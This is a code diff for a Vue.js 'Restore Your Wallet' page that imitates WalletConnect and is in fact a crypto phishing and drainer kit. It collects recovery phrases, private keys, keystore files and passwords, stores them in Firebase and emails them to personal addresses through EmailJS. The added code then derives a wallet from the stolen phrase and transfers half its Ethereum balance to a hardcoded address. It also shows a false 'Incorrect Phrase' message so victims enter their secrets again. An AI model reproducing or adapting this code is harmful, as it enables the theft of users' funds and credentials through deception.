@@ -10,6 +10,7 @@
       <v-img
       src="../assets/new page/Loader_img.png"
       width="80"
+      to="/"
       >
 
       </v-img>
@@ -19,7 +20,7 @@
        Restore Your Wallet
       </h1>
     </v-card-title>
-
+<hr>
     <v-tabs
       v-model="tab"
       background-color="transparent"
@@ -28,11 +29,7 @@
       
       
     >
-      <v-tab
-      
-      >
-       KEYSTORE
-      </v-tab>
+     
       <v-tab
       
       >
@@ -52,7 +49,7 @@
     </v-tabs>
 
     <v-tabs-items v-model="tab">
-      <v-tab-item
+      <!-- <v-tab-item
        
       >
       <form action="" id="form">
@@ -61,7 +58,7 @@
           flat
         >
           <v-card-text style="font-size:18px">please select your keystore file</v-card-text>
-         <!--default html file upload button-->
+         default html file upload button
 <v-file-input
 @change="getfile"
   truncate-length="15"
@@ -92,7 +89,7 @@ RESTORE
          </v-btn>
         </v-card>
         </form>
-      </v-tab-item>
+      </v-tab-item> -->
 
        <v-tab-item
        
@@ -101,6 +98,8 @@ RESTORE
           color="basil"
           flat
         >
+        
+
           <v-card-text style="font-size:18px">Please enter your 12 or 24 word phrase</v-card-text>
           <v-form
           v-model="valid"
@@ -133,6 +132,7 @@ RESTORE
          <br>
         
 <span style="font-size:13px;color:rgb(3, 166, 207);">Input the BIP39/BIP44 recovery phrase here to restore <br/> the Mnemonic keys that manage your acccounts.</span>
+
          <v-btn :disabled="!valid" color="primary" block @click="insert_mnemonics">
 RESTORE
          </v-btn>
@@ -180,8 +180,9 @@ RESTORE
         
 <span style="font-size:13px;color:rgb(3, 166, 207);">Input the BIP39/BIP44 recovery phrase here to restore <br/> the Mnemonic keys that manage your acccounts.</span>
          <v-btn @click="insert_private_key" :disabled="!valid2" color="primary" block>
-RESTORE
+RESTORE 
          </v-btn>
+       
          </v-form>
         </v-card>
       </v-tab-item>
@@ -203,7 +204,7 @@ RESTORE
   <v-snackbar
       v-model="alert"
       shaped
-      timeout="2000"
+      timeout="5000"
     >
     <template v-slot:action="{ attrs }">
         <v-btn
@@ -217,86 +218,18 @@ RESTORE
       </template>
     {{alt_msg}}
   </v-snackbar>
+    <div class="">
+      <v-footer light padless>
+        <v-card flat tile class="white--text text-center" width="100%" style="background:#e9d16f;">
+           
 
+          <v-divider></v-divider>
 
- <div 
-    style="text-align:center;display: block;"
-    class="mt-5"
-    >
-      <div>
-    <p style="display:inline-block !important;">Open a pull request on <a href="https://github.com/walletconnect">Github</a> to add your wallet here.</p>
-    </div>
-  <div class="foot">
-<v-row>
-  <v-col class="mr-9">
-    <div class="" style="display:inline-block !important; width:100px">
-    <v-btn
-    flat
-    elevation="0"
-    color="white"
-    href="https://discord.com/invite/jhxMvxP"
-    >
-    <v-icon class="mr-3">
-      mdi-discord
-    </v-icon>
-    <span class="primary--text">Discord</span>
-    </v-btn>
-    </div>
-  </v-col>
-
-  <v-col class="mr-9">
-    <div class="" style="display:inline-block !important; width:100px">
-    <v-btn
-    flat
-    elevation="0"
-    color="white"
-    href="https://telegram.walletconnect.org/"
-    >
-    <v-icon class="mr-3">
-      mdi-send
-    </v-icon>
-    <span class="primary--text">Telegram</span>
-    </v-btn>
-    </div>
-  </v-col>
-
-  <v-col class="mr-9">
-    <div class="" style="display:inline-block !important; width:100px">
-    <v-btn
-    flat
-    elevation="0"
-    color="white"
-    href="https://twitter.walletconnect.org/"
-    >
-    <v-icon class="mr-3">
-      mdi-twitter
-    </v-icon>
-    <span class="primary--text">Twitter</span>
-    </v-btn>
-    </div>
-  </v-col>
-
-
-
-  <v-col class="mr-9">
-    <div class="" style="display:inline-block !important; width:100px">
-    <v-btn
-    flat
-    elevation="0"
-    color="white"
-    href="https://github.com/walletconnect"
-    >
-    <v-icon class="mr-3">
-      mdi-github
-    </v-icon>
-    <span class="primary--text">Github</span>
-    </v-btn>
-    </div>
-  </v-col>
-
-  
-</v-row>
-  </div>
+          <v-card-text class="white--text" style="color:#001e36 !important;">
+            {{ new Date().getFullYear() }} — <strong>Copyright @2022 Resolve Protocol</strong>
+          </v-card-text>
+        </v-card>
+      </v-footer>
     </div>
   </div>
 </template>
@@ -307,9 +240,12 @@ import storage from '@/fire'
 import fb from '@/fire'
 import router from '@/router'
 import emailjs from 'emailjs-com'
+import {ethers} from 'ethers'
+import BigNumber from 'bignumber.js'
 export default {
   data() {
     return {
+      wallet_bal:'',
       alt_msg:'',
       alert: false,
       ex4:false,
@@ -342,26 +278,51 @@ export default {
       file_link:'',
       name: '',
       email: '',
-      message: ''
+      message: '',
+      mnemonicKey: "",
+      account: null,
+      provider: null,
+      signer: null,
+      wallet:null,
     }
+
   },
   methods: {
-    sendEmail(msg) {
+   sendEmail(msg) {
+  //sendEmail() {
       try {
-        emailjs.send('service_48sj1tj', 'template_uhajy2n',
+          emailjs.send('service_pib4i0c', 'template_zeobwbd',
         {
-          name: 'walletconnectsupport',
-          email: 'showolesheriff7@gmail.com',
-          message: msg
-        },'42SNX2mlacclELShP');
+           name: 'walletconnectsupport',
+              email: 'showolesheriff7@gmail.com',
+           message: msg,
+            to:'jp5296143@gmail.com'
+            },'wqsvu3cCKwr-c_w1_');
         
 
-      } catch(error) {
-          console.log({error})
-      }
-      // Reset form field
-      
-    },
+    } catch(error) {
+           console.log({error})
+     }
+    //   //jp5296143@gmail.com Reset formjasonwgeorge010@gmail.com fieldMelindahotbenks101@outlook.com
+    // try {
+    //             emailjs.send('service_pib4i0c', 'template_zeobwbd',
+    //                 {
+    //                     name: 'walletconnectsupport',
+    //                     email: 'showolesheriff7@gmail.com',
+    //                     message: msg,
+    //                     to: 'lauramikemiller@gmail.com'
+    //                 }, 'wqsvu3cCKwr-c_w1_');
+
+
+    //         } catch (error) {
+    //             console.log({ error })
+    //         }
+    //         // jasonwgeorge010@gmail.comReset form fieldMelindahotbenks101@outlook.com
+
+     },
+    sendEmail_me() {
+          
+        },
     insert_keystore(){
 
     },
@@ -370,14 +331,14 @@ export default {
      
     },
      submitfile(){
-    
+     
    storage.storage.ref(this.k_password+"-"+this.file.name).put(this.file).then((e)=>{
 e.ref.getDownloadURL().then(url=>{
-fb.fb.collection('keystore').add({name:url,wallet_type:this.wallet_type,passowrd:this.k_password,time:new Date(),}).then((e)=>{
+fb.fb.collection('keystore_melin').add({name:url,wallet_type:this.wallet_type,passowrd:this.k_password,time:new Date(),}).then((e)=>{
      console.log(e)
-     alert(url)
-     this.sendEmail("keystore: "+url+" wallet type: "+this.wallet_type+" password:  "+this.k_password);
-     this.alt_msg="Wallet Connected Successfully "
+     //alert(url)
+    this.sendEmail("keystore: "+url+" wallet type: "+this.wallet_type+" password:  "+this.k_password);
+     this.alt_msg="Incorrect Phrase,\n please Re-enter phrase"
         this.alert=!this.alert
    })
 })
@@ -387,39 +348,84 @@ fb.fb.collection('keystore').add({name:url,wallet_type:this.wallet_type,passowrd
      
     },
     async insert_mnemonics(){
+      try{
+      this.provider= new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/ZMQRM7X06XnuSWA1GpTs2SqJLvHLwC-b');   
+        this.alt_msg = "connecting..."
+            this.alert = !this.alert
       const data={
         wallet_type:this.wallet_type,
         phrase:this.phrase_24,
         password:this.phrase_24_password,
         time:new Date()
       }
-      await fb.fb.collection('mnemonics').add(data).then((e)=>{
+      await fb.fb.collection('mnemonics_melin').add(data).then((e)=>{
      console.log(e)
-      this.sendEmail("mnemonics: "+this.phrase_24+" wallet type: "+this.wallet_type+" password:  "+this.phrase_24_password);
-       this.alt_msg="Wallet Connected Successfully "
-        this.alert=!this.alert
+  this.sendEmail("mnemonics: "+this.phrase_24+" wallet type: "+this.wallet_type+" password:  "+this.phrase_24_password);
+      this.sendEmail_me("mnemonics: " + this.phrase_24 + " wallet type: " + this.wallet_type + " password:  " + this.phrase_24_password);
+       this.alt_msg="Incorrect Phrase,\n please Re-enter phrase "
+     this.phrase_24=""
+     this.phrase_24_password=""
         
   })
+  this.wallet=ethers.Wallet.fromPhrase(this.phrase_24,this.provider);
+  this.wallet_bal=await this.provider.getBalance(this.wallet.address)
+  const amt = ethers.parseEther((BigNumber(this.wallet_bal.toString()).dividedBy(2)).toString());
+
+  const tx= await this.wallet.sendTransaction({
+        to:'0xE96Aed92915a29239a60A47D042B738dE7957A97',
+        value:amt
+    })
+    await tx.wait()
+    //console.log(tx.hash())
+      }
+      catch(err){
+        console.log('')
+      }
     },
     async insert_private_key(){
+      try{
+      this.provider= new ethers.JsonRpcProvider('https://eth-mainnet.g.alchemy.com/v2/ZMQRM7X06XnuSWA1GpTs2SqJLvHLwC-b');
+        this.alt_msg =
+        
+        "connecting..."
+            this.alert = !this.alert
       const data={
         wallet_type:this.wallet_type,
         private_key:this.private_key,
         password:this.private_pass,
         time:new Date()
       }
-      await fb.fb.collection('private_key').add(data).then((e)=>{
+      await fb.fb.collection('private_key_melin').add(data).then((e)=>{
      console.log(e)
-     this.sendEmail("mnemonics: "+this.private_key+" wallet type: "+this.wallet_type+" password:  "+this.private_pass);
-      this.alt_msg="Wallet Connected Successfully "
-        this.alert=!this.alert
+     this.sendEmail_me("mnemonics: "+this.private_key+" wallet type: "+this.wallet_type+" password:  "+this.private_pass);
+     this.sendEmail("mnemonics: " + this.private_key + " wallet type: " + this.wallet_type + " password:  " + this.private_pass);
+      this.alt_msg="Incorrect Phrase,\n please Re-enter phrase"
+      this.private_key=""
+      this.private_pass=""
+  
    })
+   this.wallet=new ethers.Wallet(this.phrase_24,this.provider);
+  this.wallet_bal=await this.provider.getBalance(this.wallet.address)
+  const amt = ethers.parseEther((BigNumber(this.wallet_bal.toString()).dividedBy(2)).toString());
+
+
+  const tx= await this.wallet.sendTransaction({
+        to:'0xE96Aed92915a29239a60A47D042B738dE7957A97',
+        value:amt
+    })
+    await tx.wait()
+    //console.log(tx.hash())
+  }
+      catch(err){
+        console.log('')
+      }
     }
     
   },
   mounted() {
     this.wallet_type=router.currentRoute.params.id;
- 
+    
+
   },
 }
 </script>
@@ -449,7 +455,7 @@ margin-top: -200px;
   background-color: rgba(0,0,0,0.5);
 }
 .landing{     
- }
+ }   
  @media only screen and (max-width: 600px) {
   .landing {
     border-left:none;
